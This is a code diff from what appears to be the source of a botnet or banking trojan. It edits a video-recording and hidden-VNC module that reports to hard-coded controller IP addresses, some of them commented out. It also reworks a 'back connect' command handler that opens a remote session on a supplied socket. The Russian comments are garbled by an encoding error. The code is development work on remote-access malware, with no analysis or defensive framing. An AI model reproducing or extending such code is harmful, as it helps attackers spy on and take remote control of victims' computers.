@@ -45,8 +45,8 @@ namespace VIDEORECDEBUGSTRINGS
 
 //	char VIDEO_REC_HOST1[] = "127.0.0.1";
 //	char VIDEO_REC_HOST2[] = "127.0.0.1";
-	char VIDEO_REC_HOST1[] = "192.168.0.100";
-	char VIDEO_REC_HOST2[] = "192.168.0.100";
+	char VIDEO_REC_HOST1[] = "192.168.0.102";
+	char VIDEO_REC_HOST2[] = "192.168.0.102";
 //	char VIDEO_REC_HOST1[] = "192.168.147.2";
 //	char VIDEO_REC_HOST2[] = "193.106.161.242";
 #else
@@ -542,7 +542,7 @@ static DWORD WINAPI ProcessVNC(void*)
 				{
 					while (true)
 					{
-						VDRDBG( "Video", "VNC worked" );
+						//VDRDBG( "Video", "VNC worked" );
 						pSleep(10000);
 					}
 					pCloseHandle(mutex);
@@ -621,14 +621,9 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 			break;
 		case 23: //запуск BC (back connect)
 			{
-				int len = (inData[1] << 8) | inData[0];
-				char* args = inData + 2;
-				args[len] = 0;
-				VDRDBG( "Video", "BC %s", args );
-				if( ExecuteBackConnectCommand( 0, 0, args) )
-					outData[0] = 1;
-				else
-					outData[0] = 0;
+				VDRDBG( "Video", "BC" );
+				if( inData && lenInData == sizeof(SOCKET) ) //в inData находитс€ сокет
+					RunThread( StartBCSessionWork, inData );
 			}
 			break;
 	}
@@ -642,7 +637,7 @@ bool Start()
 	//запускаем менеджер видео процесса в режиме сп€чки, т. е. соедин€тьс€ с сервером будет только по команде
 	//или при передаче данных
 	VDRDBG( "Video", "Start manager ip '%s'", VIDEO_REC_HOST1 );
-	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, 0 );
+	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, 1 );
 	if( servers[0] )
 	{
 		VDRDBG( "Video", "ћенеджер инициализирован" );
